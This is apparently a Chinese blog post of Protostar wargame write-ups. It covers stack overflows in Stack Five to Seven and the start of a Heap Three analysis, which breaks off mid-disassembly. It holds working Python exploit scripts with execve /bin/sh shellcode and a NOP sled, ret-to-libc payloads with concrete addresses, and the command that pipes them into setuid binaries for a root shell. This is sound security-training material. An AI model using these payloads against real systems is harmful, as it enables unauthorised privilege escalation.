<pre class="line-numbers language-none"><code class="language-none">setuid代表设置用户身份，并且setuid设置调用进程的有效用户ID，用户运行程序的uid与调用进程的真实uid不匹配<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p> 这么说起来有点绕，我们来举一个例子 </p>
<pre class="line-numbers language-none"><code class="language-none">一个要以root权限运行的程序，但我们想让普通用户也能运行它，但又要防止该程序被攻击者利用，这里就需要用的setuid了<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="/img/1731486145052.png"></p>
<p> r代表读，w代表写，x代表执行，那s是什么呢 </p>
<pre class="line-numbers language-none"><code class="language-none">s替换了以x的可执行文件，这被称为setuid位，根据刚刚的操作，应该知道了s是做什么的<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>当这个位被user权限的用户执行时，linux实际上是以文件的创造者的权限运行的，在这种情况下，它是以root权限运行的     <strong>我们的目标就是，破解这些文件然后拿到root权限</strong> </p>
<h4 id="什么是栈"><a href="#什么是栈" class="headerlink" title="什么是栈"></a>什么是栈</h4><p>可以把栈想象成一个堆积的书本，你可以把新的书本放在最顶部，也可以取出最顶部的书本。(也可以想象成扑克牌，同理，怎么好理解怎么理解)</p>
<p>当程序执行时，它会使用栈来跟踪函数调用和变量的值。每次你调用一个函数，计算机会在栈上创建一个新的“帧”（就像书本一样），用来存储这个函数的局部变量和执行时的一些信息。当函数执行完毕时，这个帧会被从栈上移除，就像取出一本书本一样。</p>
<p>栈通常是“后进先出”的，这意味着最后放入栈的数据会最先被取出。这是因为栈的操作是非常快速和高效的，所以它经常用于管理函数调用和跟踪程序执行流程</p>
<h4 id="为什么要覆盖ret返回地址"><a href="#为什么要覆盖ret返回地址" class="headerlink" title="为什么要覆盖ret返回地址"></a>为什么要覆盖ret返回地址</h4><p>覆盖 ret 返回地址是一种计算机攻击技巧，攻击者利用它来改变程序执行的路径。这个过程有点像将一个路标或导航指令替换成你自己的指令，以便程序执行到你想要的地方。</p>
<p>想象一下，你在开车时遇到一个交叉路口，路标告诉你向左拐才能到达目的地。但是，攻击者可能会悄悄地改变路标，让你误以为需要向右拐。当你按照这个伪装的路标行驶时，你最终会到达攻击者想要的地方，而不是你本来的目的地。</p>
<p>在计算机中，程序执行的路径通常是通过返回地址控制的，这个返回地址告诉计算机在函数执行完毕后应该继续执行哪里的代码。攻击者可以通过修改这个返回地址，迫使程序跳转到他们指定的地方，通常是一段恶意代码，而不是正常的程序代码</p>
<h3 id="获取ret返回地址"><a href="#获取ret返回地址" class="headerlink" title="获取ret返回地址"></a>获取ret返回地址</h3><p>使用gdb打开程序，在执行leave指令的地方下一个断点</p>
<p><img src="/img/1731486503524.png"></p>
<p> 运行程序，随便输入一些字符，然后查看栈状态 </p>
<pre class="line-numbers language-none"><code class="language-none">x&#x2F;25wx $esp<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="/img/1731486596363.png"></p>
<p>然后重新加载程序，在ret下断点，查看寄存器中程序跳转地址</p>
<p><img src="/img/1731486753023.png"></p>
<p>由上面两图可以计算出需要80个字符才能完全覆盖ret返回地址， 然后再将我们的shellcode放到控制数据的堆栈里 </p>
<p><img src="/img/1731486937170.png"></p>
<p><img src="/img/1731486852593.png"></p>
<h4 id="nop指令"><a href="#nop指令" class="headerlink" title="nop指令"></a>nop指令</h4><p>NOP指令是一种特殊的机器指令，它在计算机中执行时不做任何操作。简单来说，NOP指令是一种“空操作”，它不改变计算机的状态、不影响寄存器的值，也不执行任何计算或跳转</p>
<p>为了防止我们shellcode收到干扰，我们在shellcode代码前添加一些nop指令即可</p>
<h3 id="脚本编写"><a href="#脚本编写" class="headerlink" title="脚本编写"></a>脚本编写</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> struct

padding <span class="token operator">=</span> <span class="token string">"A"</span> <span class="token operator">*</span> <span class="token number">76</span>
eip <span class="token operator">=</span> struct<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token string">"I"</span><span class="token punctuation">,</span><span class="token number">0xbffff7c0</span><span class="token punctuation">)</span>
nopnop <span class="token operator">=</span> <span class="token string">"\x90"</span><span class="token operator">*</span><span class="token number">64</span>
payload <span class="token operator">=</span> <span class="token string">"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x88"</span>

<span class="token keyword">print</span> padding<span class="token operator">+</span>eip<span class="token operator">+</span>nopnop<span class="token operator">+</span>payload<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>首先设置一个76位的垃圾字符，然后利用struct模块的pack功能，作用是将一个无符号整数（I 表示无符号整数）转换为二进制数据，跳转到控制数据的栈里，最后写入nop指令和shellcode代码，shellcode代码可以在这个网站里找到 </p>
<pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;shell-storm.org&#x2F;shellcode&#x2F;files&#x2F;shellcode-811.html<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="/img/1731487160482.png"></p>
<p>这是一个linux x86架构执行/bin/sh的shellcode</p>
<p>如果我们直接运行脚本是得不到/bin/sh的<img src="/img/1731487346049.png"></p>
<p> 其实/bin/sh已经执行了，只是没有输入，我们可以用cat命令来重定向到标准输入输出 </p>
<pre class="line-numbers language-none"><code class="language-none">(python stack5exp.py ; cat) | &#x2F;opt&#x2F;protostar&#x2F;bin&#x2F;stack5<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="/img/1731487445527.png"></p>
<p> 成功破解程序 </p>
<h2 id="Stack-Six"><a href="#Stack-Six" class="headerlink" title="Stack Six"></a>Stack Six</h2><p>Stack Six和Stack Seven的源代码是一样的，可以通过ret to libc的方式获取shell</p>
<h3 id="程序静态分析-1"><a href="#程序静态分析-1" class="headerlink" title="程序静态分析"></a>程序静态分析</h3><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span>

<span class="token keyword">void</span> <span class="token function">getpath</span><span class="token punctuation">(</span><span class="token punctuation">)</span>   <span class="token comment">//定义一个名为getpath的函数</span>
<span class="token punctuation">&#123;</span>
  <span class="token keyword">char</span> buffer<span class="token punctuation">[</span><span class="token number">64</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> ret<span class="token punctuation">;</span>

  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"input path please: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">fflush</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//输出字符串input path please: </span>

  <span class="token function">gets</span><span class="token punctuation">(</span>buffer<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//获取用户输入，将输入存储到buffer函数变量里</span>

  ret <span class="token operator">=</span> <span class="token function">__builtin_return_address</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">//获取ret返回的内存地址</span>

  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span>ret <span class="token operator">&amp;</span> <span class="token number">0xbf000000</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0xbf000000</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>   <span class="token comment">//如果内存地址的前两位是0xbf</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"bzzzt (%p)\n"</span><span class="token punctuation">,</span> ret<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//输出bzzzt</span>
    <span class="token function">_exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>

  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"got path %s\n"</span><span class="token punctuation">,</span> buffer<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//输出got path</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">)</span>  <span class="token comment">//主函数</span>
<span class="token punctuation">&#123;</span>
  <span class="token function">getpath</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//调用getpath函数</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h4 id="ret-to-libc"><a href="#ret-to-libc" class="headerlink" title="ret to libc"></a>ret to libc</h4><p>ret to libc是将程序的返回地址覆盖为标准 C 库中的某个函数的地址，如 “system” 函数，这个函数可以用来执行系统命令。然后，攻击者构造一个有效的参数，比如”<strong>/bin/sh</strong>“，将其传递给 “<strong>system</strong>” 函数，从而获取shell</p>
<h3 id="寻找system函数地址和-bin-sh字符串"><a href="#寻找system函数地址和-bin-sh字符串" class="headerlink" title="寻找system函数地址和/bin/sh字符串"></a>寻找system函数地址和/bin/sh字符串</h3><p>用gdb打开程序，在getpath函数执行leave指令的地址打一个断点</p>
<pre class="line-numbers language-none"><code class="language-none">disassemble getpath
b *0x080484f8<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p><img src="/img/1731487814323.png"></p>
<p> 运行程序后随意输入一些字符串，然后寻找system函数的地址 </p>
<pre class="line-numbers language-none"><code class="language-none">r
p system<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p><img src="/img/1731487888937.png"></p>
<p>system函数地址为：<strong>0xb7ecffb0</strong>，找到了system函数地址，现在我们就要找让system函数执行命令的字符串，为了获取shell，我们寻找”<strong>/bin/sh</strong>“字符串</p>
<h4 id="什么是内存映射"><a href="#什么是内存映射" class="headerlink" title="什么是内存映射"></a>什么是内存映射</h4><p>内存映射是一种操作系统和计算机体系结构中常见的技术，用于将文件或其他设备的内容映射到进程的地址空间，使得进程可以像访问内存一样访问这些内容</p>
<h4 id="什么是libc库"><a href="#什么是libc库" class="headerlink" title="什么是libc库"></a>什么是libc库</h4><p>在编译程序时，我们要调用函数，为了缩小程序大小，我们通常会动态编译文件，程序调用函数时，就会到指定的libc库里查找并执行</p>
<p>执行i proc mappings查看程序内存映射</p>
<pre class="line-numbers language-none"><code class="language-none">i proc mappings<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="/img/1731488032573.png"></p>
<p> stack6的libc库为：**/lib/libc-2.11.2.so<strong>，libc的基地址为：</strong>0xb7e97000** </p>
<p> 现在新开一个终端，在libc库里查找/bin/sh字符串的地址 </p>
<pre class="line-numbers language-none"><code class="language-none">strings -t d &#x2F;lib&#x2F;libc-2.11.2.so | grep &quot;&#x2F;bin&#x2F;sh&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="/img/1731488182979.png"></p>
<p> 字符串/bin/sh的偏移地址为：<strong>1176511</strong>，<strong>libc的基地址+字符串的偏移地址=程序调用字符串的完整地址</strong> </p>
<h3 id="寻找程序溢出大小"><a href="#寻找程序溢出大小" class="headerlink" title="寻找程序溢出大小"></a>寻找程序溢出大小</h3><p>查看main函数代码</p>
<pre class="line-numbers language-none"><code class="language-none">disassemble main<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="/img/1731488272525.png"></p>
<p> 程序调用了getpath函数后，会返回0x08048505继续执行下一个指令，重新运行程序，随便输入一些字符，然后查看栈状态 </p>
<p><img src="/img/1731488402448.png"></p>
<p>我们输入的字符串离0x08048505有80个字节，在0x08048505上面还有一个0x08048505，那个只是普通的值，在程序返回main函数时，还会调用其他的系统函数，所以下一个才是getpath函数ret main函数的值 </p>
<h3 id="脚本编写-1"><a href="#脚本编写-1" class="headerlink" title="脚本编写"></a>脚本编写</h3><p>现在我们可以写一个脚本来破解程序 </p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> struct

<span class="token builtin">buffer</span> <span class="token operator">=</span> <span class="token string">"A"</span><span class="token operator">*</span><span class="token number">80</span>   <span class="token operator">//</span>覆盖到ret地址的函数

system <span class="token operator">=</span> struct<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token string">"I"</span><span class="token punctuation">,</span><span class="token number">0xb7ecffb0</span><span class="token punctuation">)</span>  <span class="token operator">//</span>system地址
ret <span class="token operator">=</span> <span class="token string">"AAAA"</span>  <span class="token operator">//</span>在执行system函数时，会调用一个返回地址，这里随意输入一些字符，下图解释

shellcode <span class="token operator">=</span> struct<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token string">"I"</span><span class="token punctuation">,</span><span class="token number">0xb7e97000</span><span class="token operator">+</span><span class="token number">1176511</span><span class="token punctuation">)</span>  <span class="token operator">//</span><span class="token operator">/</span><span class="token builtin">bin</span><span class="token operator">/</span>sh字符串地址

payload <span class="token operator">=</span> <span class="token builtin">buffer</span> <span class="token operator">+</span> system <span class="token operator">+</span> ret <span class="token operator">+</span> shellcode
<span class="token keyword">print</span> payload<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>在执行system函数时，会调用一个返回地址，可以随意输入一些字符，然后就会执行”/bin/sh”字符串 </p>
<p><img src="/img/1731488571058.png"></p>
<p> 执行程序，成功获得root权限 </p>
<p><img src="/img/1731488765115.png"></p>
<h2 id="Stack-Seven"><a href="#Stack-Seven" class="headerlink" title="Stack Seven"></a>Stack Seven</h2><p>Stack Seven和Stack Six的程序源代码很像，只是修改了一下判断的值</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span>

<span class="token keyword">void</span> <span class="token function">getpath</span><span class="token punctuation">(</span><span class="token punctuation">)</span>   <span class="token comment">//定义一个名为getpath的函数</span>
<span class="token punctuation">&#123;</span>
  <span class="token keyword">char</span> buffer<span class="token punctuation">[</span><span class="token number">64</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> ret<span class="token punctuation">;</span>

  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"input path please: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">fflush</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//输出字符串input path please: </span>

  <span class="token function">gets</span><span class="token punctuation">(</span>buffer<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//获取用户输入，将输入存储到buffer函数变量里</span>

  ret <span class="token operator">=</span> <span class="token function">__builtin_return_address</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">//获取ret返回的内存地址</span>

  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span>ret <span class="token operator">&amp;</span> <span class="token number">0xb0000000</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0xb0000000</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>   <span class="token comment">//如果内存地址的前一位是0xb</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"bzzzt (%p)\n"</span><span class="token punctuation">,</span> ret<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//输出bzzzt</span>
    <span class="token function">_exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>

  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"got path %s\n"</span><span class="token punctuation">,</span> buffer<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//输出got path</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">)</span>  <span class="token comment">//主函数</span>
<span class="token punctuation">&#123;</span>
  <span class="token function">getpath</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//调用getpath函数</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>我们只需要多加一个ret指令的地址，让程序返回到我们指定的地方执行system函数和/bin/sh字符串 </p>
<h3 id="寻找ret地址"><a href="#寻找ret地址" class="headerlink" title="寻找ret地址"></a>寻找ret地址</h3><p>我们可以使用objdump工具来寻找ret指令的地址</p>
<pre class="line-numbers language-none"><code class="language-none">objdump -D stack7 | grep ret<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="/img/1731489119446.png"></p>
<p>这里有很多ret指令的地址，我们随便选一个即可开始写脚本</p>
<p>脚本和stack six一样，只需要添加一个ret指令地址即可</p>
<h3 id="脚本编写-2"><a href="#脚本编写-2" class="headerlink" title="脚本编写"></a>脚本编写</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> struct

<span class="token builtin">buffer</span> <span class="token operator">=</span> <span class="token string">"A"</span><span class="token operator">*</span><span class="token number">80</span>

ret_addr <span class="token operator">=</span> struct<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token string">"I"</span><span class="token punctuation">,</span> <span class="token number">0x8048383</span><span class="token punctuation">)</span>
system <span class="token operator">=</span> struct<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token string">"I"</span><span class="token punctuation">,</span><span class="token number">0xb7ecffb0</span><span class="token punctuation">)</span>
ret <span class="token operator">=</span> <span class="token string">"AAAA"</span>

shellcode <span class="token operator">=</span> struct<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token string">"I"</span><span class="token punctuation">,</span><span class="token number">0xb7e97000</span><span class="token operator">+</span><span class="token number">1176511</span><span class="token punctuation">)</span>

payload <span class="token operator">=</span> <span class="token builtin">buffer</span> <span class="token operator">+</span> ret_addr <span class="token operator">+</span>system<span class="token operator">+</span> ret <span class="token operator">+</span> shellcode
<span class="token keyword">print</span> payload<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="/img/1731489222312.png"></p>
<p> 成功获得root权限 </p>
]]></content>
      <categories>
        <category>学习</category>
      </categories>
      <tags>
        <tag>笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>Pwn-protostar靶场8 heap three</title>
    <url>/2024/11189e20.html</url>
    <content><![CDATA[<span id="more"></span>

<h1 id="Pwn-protostar靶场8-heap-three"><a href="#Pwn-protostar靶场8-heap-three" class="headerlink" title="Pwn-protostar靶场8 heap three"></a>Pwn-protostar靶场8 heap three</h1><h2 id="heap3"><a href="#heap3" class="headerlink" title="heap3"></a>heap3</h2><h3 id="程序静态分析"><a href="#程序静态分析" class="headerlink" title="程序静态分析"></a>程序静态分析</h3><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/types.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>

<span class="token keyword">void</span> <span class="token function">winner</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  #定义了一个名为winner的函数
<span class="token punctuation">&#123;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"that wasn't too bad now, was it? @ %d\n"</span><span class="token punctuation">,</span> <span class="token function">time</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  #输出字符串
<span class="token punctuation">&#125;</span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">)</span>  #主函数，从终端接收输入
<span class="token punctuation">&#123;</span>
  <span class="token keyword">char</span> <span class="token operator">*</span>a<span class="token punctuation">,</span> <span class="token operator">*</span>b<span class="token punctuation">,</span> <span class="token operator">*</span>c<span class="token punctuation">;</span>  #声明了三个字符指针 a、b 和 c，用于指向后面通过 malloc 分配的内存

  a <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  #给a分配了<span class="token number">32</span>字节的内存
  b <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  #给b分配了<span class="token number">32</span>字节的内存
  c <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  #给c分配了<span class="token number">32</span>字节的内存

  <span class="token function">strcpy</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  #将命令行参数argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> 复制到先前分配的内存中
  <span class="token function">strcpy</span><span class="token punctuation">(</span>b<span class="token punctuation">,</span> argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  #将命令行参数argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> 复制到先前分配的内存中
  <span class="token function">strcpy</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span> argv<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  #将命令行参数argv<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> 复制到先前分配的内存中

  <span class="token function">free</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">;</span>  #释放分配给 c 的内存
  <span class="token function">free</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">;</span>  #释放分配给 b 的内存
  <span class="token function">free</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span>  #释放分配给 a 的内存

  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"dynamite failed?\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  #输出字符串
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p> 程序不复杂，但是想弄懂漏洞的机制还是很复杂的 </p>
<h3 id="堆的结构"><a href="#堆的结构" class="headerlink" title="堆的结构"></a>堆的结构</h3><p>在malloc.c 源代码中，malloc_chunk 是这样定义的：</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">struct</span> <span class="token class-name">malloc_chunk</span> <span class="token punctuation">&#123;</span>
  INTERNAL_SIZE_T      prev_size<span class="token punctuation">;</span>
  INTERNAL_SIZE_T      size<span class="token punctuation">;</span>

  <span class="token keyword">struct</span> <span class="token class-name">malloc_chunk</span><span class="token operator">*</span> fd<span class="token punctuation">;</span>
  <span class="token keyword">struct</span> <span class="token class-name">malloc_chunk</span><span class="token operator">*</span> bk<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p> malloc 以块（<a href="https://so.csdn.net/so/search?q=chunk&spm=1001.2101.3001.7020">chunk</a>）为单位分配内存，其结构如下： </p>
<p><img src="/img/1731906755721.png"></p>
<h4 id="chunk-start："><a href="#chunk-start：" class="headerlink" title="chunk start："></a>chunk start：</h4><p>这是内存块的起始地址。在分配内存时，内存管理器会返回指向这个位置之后的一个指针，具体是mem字段。</p>
<h4 id="prev-size："><a href="#prev-size：" class="headerlink" title="prev_size："></a>prev_size：</h4><p>前一个块（previous chunk）的大小。前一个块是空闲的时候，这个字段才有意义，因为它会被用于合并空闲块。</p>
<h4 id="size："><a href="#size：" class="headerlink" title="size："></a>size：</h4><p>当前块的大小，包括所有的元数据和数据区。这个大小通常包括一些标志位，比如当前块是否被分配或者前一个块是否为空闲。</p>
<h4 id="fd-forward-pointer-："><a href="#fd-forward-pointer-：" class="headerlink" title="fd (forward pointer)："></a>fd (forward pointer)：</h4><p>在空闲块（free chunk）中使用，指向双向空闲列表中的下一个空闲块。这是双向链表的一部分，用于快速查找和合并空闲内存。</p>
<h4 id="bk-backward-pointer-："><a href="#bk-backward-pointer-：" class="headerlink" title="bk (backward pointer)："></a>bk (backward pointer)：</h4><p>同样在空闲块中使用，指向双向空闲列表中的上一个空闲块。与 fd 一起，这些指针管理空闲内存，使得空闲内存的合并和重新分配更加高效。</p>
<h4 id="data："><a href="#data：" class="headerlink" title="data："></a>data：</h4><p>这是实际分配给用户的内存区域。当程序请求内存时，内存分配器会提供一个指向这部分的指针。</p>
<h4 id="mem："><a href="#mem：" class="headerlink" title="mem："></a>mem：</h4><p>这通常是指向data区域的指针，也是程序实际使用的内存块的起始地址。注意：这个指针通常会按照某种对齐方式进行调整，确保性能最优。</p>
<h4 id="next-chunk-start："><a href="#next-chunk-start：" class="headerlink" title="next chunk start："></a>next chunk start：</h4><p>这是下一个内存块的起始地址。内存分配器会使用当前块的size来找到下一个块的起始位置。</p>
<h3 id="程序动态分析"><a href="#程序动态分析" class="headerlink" title="程序动态分析"></a>程序动态分析</h3><p>用gdb打开程序，在调用mallco，strcpy，free函数的地方下一个断点</p>
<pre class="line-numbers language-none"><code class="language-none">user@protostar:&#x2F;opt&#x2F;protostar&#x2F;bin$ gdb heap3
GNU gdb (GDB) 7.0.1-debian
Copyright (C) 2009 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later &lt;http:&#x2F;&#x2F;gnu.org&#x2F;licenses&#x2F;gpl.html&gt;
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type &quot;show copying&quot;
and &quot;show warranty&quot; for details.
This GDB was configured as &quot;i486-linux-gnu&quot;.
For bug reporting instructions, please see:
&lt;http:&#x2F;&#x2F;www.gnu.org&#x2F;software&#x2F;gdb&#x2F;bugs&#x2F;&gt;...
Reading symbols from &#x2F;opt&#x2F;protostar&#x2F;bin&#x2F;heap3...done.
(gdb) disassemble main
Dump of assembler code for function main:
0x08048889 &lt;main+0&gt;:    push   %ebp
0x0804888a &lt;main+1&gt;:    mov    %esp,%ebp
0x0804888c &lt;main+3&gt;:    and    $0xfffffff0,%esp
0x0804888f &lt;main+6&gt;:    sub    $0x20,%esp
0x08048892 &lt;main+9&gt;:    movl   $0x20,(%esp)
0x08048899 &lt;main+16&gt;:   call   0x8048ff2 &lt;malloc&gt;
0x0804889e &lt;main+21&gt;:   mov    %eax,0x14(%esp)
0x080488a2 &lt;main+25&gt;:   movl   $0x20,(%esp)
0x080488a9 &lt;main+32&gt;:   call   0x8048ff2 &lt;malloc&gt;
0x080488ae &lt;main+37&gt;:   mov    %eax,0x18(%esp)
0x080488b2 &lt;main+41&gt;:   movl   $0x20,(%esp)
0x080488b9 &lt;main+48&gt;:   call   0x8048ff2 &lt;malloc&gt;
0x080488be &lt;main+53&gt;:   mov    %eax,0x1c(%esp)
0x080488c2 &lt;main+57&gt;:   mov    0xc(%ebp),%eax
0x080488c5 &lt;main+60&gt;:   add    $0x4,%eax
